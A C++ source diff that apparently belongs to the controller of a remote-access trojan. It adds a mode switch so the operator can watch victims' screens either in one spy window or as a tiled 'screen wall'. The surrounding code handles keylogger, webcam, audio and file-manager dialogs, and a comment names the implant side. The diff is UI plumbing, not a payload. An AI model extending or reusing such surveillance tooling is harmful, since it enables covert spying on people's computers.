@@ -996,7 +996,10 @@ void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
 			((CFileManagerDlg *)dlg)->OnReceiveComplete();
 			break;
 		//#TODO 目前改为屏幕墙功能
-		case SCREENSPY_DLG:
+		case SCREENWALL_DLG:
+			//if(GetMode() == 1)
+			//((CScreenSpyDlg *)dlg)->OnReceiveComplete();
+			//else if (GetMode() == 2)
 			((CScreenSpyDlgSmall *)dlg)->OnReceiveComplete();
 			break;
 		case KEYBOARD_DLG:
@@ -1110,7 +1113,10 @@ void CMainFrame::ProcessReceive(ClientContext *pContext)
 		switch (pContext->m_Dialog[0])
 		{
 			//#TODO 目前改为屏幕墙功能
-		case SCREENSPY_DLG:
+		case SCREENWALL_DLG:
+			//	if(GetMode() == 1)
+			//((CScreenSpyDlg *)dlg)->OnReceive();
+			//else if (GetMode() == 2)
 			((CScreenSpyDlgSmall *)dlg)->OnReceive();
 			break;
 		case WEBCAM_DLG:
@@ -1323,7 +1329,7 @@ LRESULT CMainFrame::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
 //	switch (pContext->m_Dialog[0])
 //	{
 //	case FILEMANAGER_DLG:
-//	case SCREENSPY_DLG:
+//	case SCREENWALL_DLG:
 //	case KEYBOARD_DLG:
 //	case WEBCAM_DLG:
 //	case AUDIO_DLG:
@@ -1495,6 +1501,7 @@ void CMainFrame::OnVideoWall()
 
 		//AfxMessageBox("只能同时启动一个屏幕墙");
 		m_dlgVideo.ShowWindow(SW_SHOW);
+		m_dlgVideo.SetActiveWindow();
 		//delete m_dlgVideo;
 
 	}
@@ -1504,6 +1511,7 @@ void CMainFrame::OnVideoWall()
 	m_dlgVideo.CenterWindow();
 	m_dlgVideo.ShowWindow(SW_SHOW);
 	}
+
 	
 }
 
@@ -1538,11 +1546,46 @@ LRESULT CMainFrame::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
+void CMainFrame::SetMode(int mode)
+{
+	this->m_ScreenMode = mode;
+}
+
+int CMainFrame::GetMode()
+{
+	return this->m_ScreenMode;
+}
+
+
+
+
 LRESULT CMainFrame::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 {
 
 
-	m_dlgVideo.ShowWindow(SW_SHOW);
+	ClientContext *pContext = (ClientContext *)lParam;
+	CScreenSpyDlg *dlg1;
+	CScreenSpyDlgSmall *dlg2;
+
+
+	switch(m_ScreenMode)
+	{
+	case 1:
+		//AfxMessageBox("Mode 1");
+	//ClientContext *pContext = (ClientContext *)lParam;
+	
+	dlg1 = new CScreenSpyDlg(this, m_iocpServer, pContext);
+	// 设置父窗口为卓面
+	dlg1->Create(IDD_SCREENSPY, GetDesktopWindow());
+	dlg1->ShowWindow(SW_SHOW);
+	
+	pContext->m_Dialog[0] = SCREENWALL_DLG;
+	pContext->m_Dialog[1] = (int)dlg1;
+		   break;
+	case 2: 
+		{
+		//AfxMessageBox("Mode 2");
+			m_dlgVideo.ShowWindow(SW_SHOW);
 
 
 	//AfxMessageBox("Start sCreen Share");
@@ -1561,9 +1604,9 @@ LRESULT CMainFrame::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 
 
 
-	ClientContext *pContext = (ClientContext *)lParam;
+	/*ClientContext *pContext = (ClientContext *)lParam;*/
 	
-	CScreenSpyDlgSmall	*dlg = new CScreenSpyDlgSmall(&m_dlgVideo, m_iocpServer, pContext,m_dlgVideo.m_nWallPoint);
+	dlg2 = new CScreenSpyDlgSmall(&m_dlgVideo, m_iocpServer, pContext,m_dlgVideo.m_nWallPoint);
 
 
 
@@ -1578,18 +1621,27 @@ LRESULT CMainFrame::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 
 	// 设置父窗口为卓面
 	//dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
-	dlg->Create(IDD_SCREENSPY_SMALL,pStatic);
-	dlg->GetWindowRect(IFramerect);
-	dlg->SetWindowPos(&wndTop, 0, 0, IFramerect.Width(), IFramerect.Height(), SWP_SHOWWINDOW);
-    dlg->ShowWindow(SW_SHOW);
+	dlg2->Create(IDD_SCREENSPY_SMALL,pStatic);
+	dlg2->GetWindowRect(IFramerect);
+	dlg2->SetWindowPos(&wndTop, 0, 0, IFramerect.Width(), IFramerect.Height(), SWP_SHOWWINDOW);
+	dlg2->ShowWindow(SW_SHOW);
+
+
+
+	pContext->m_Dialog[0] = SCREENWALL_DLG;
+	pContext->m_Dialog[1] = (int)dlg2;
+		}
+			break;
+	}
 	
 	
-	pContext->m_Dialog[0] = SCREENSPY_DLG;
-	pContext->m_Dialog[1] = (int)dlg;
+	
+
 	return 0;
 }
 //#TODO 屏幕墙功能开发
 //小马端那边要发送一个新的枚举
+//不用小马那边增加了，直接在这边增加一个m_ScreenMode 变量做判断
 LRESULT CMainFrame::OnAddToScreenWall(WPARAM wParam, LPARAM lParam)
 {
 	//ClientContext *pContext = (ClientContext *)lParam;
@@ -1599,7 +1651,7 @@ LRESULT CMainFrame::OnAddToScreenWall(WPARAM wParam, LPARAM lParam)
 	//dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
 	//dlg->ShowWindow(SW_SHOW);
 	//
-	//pContext->m_Dialog[0] = SCREENSPY_DLG;
+	//pContext->m_Dialog[0] = SCREENWALL_DLG;
 	//pContext->m_Dialog[1] = (int)dlg;
 	return 0;
 }
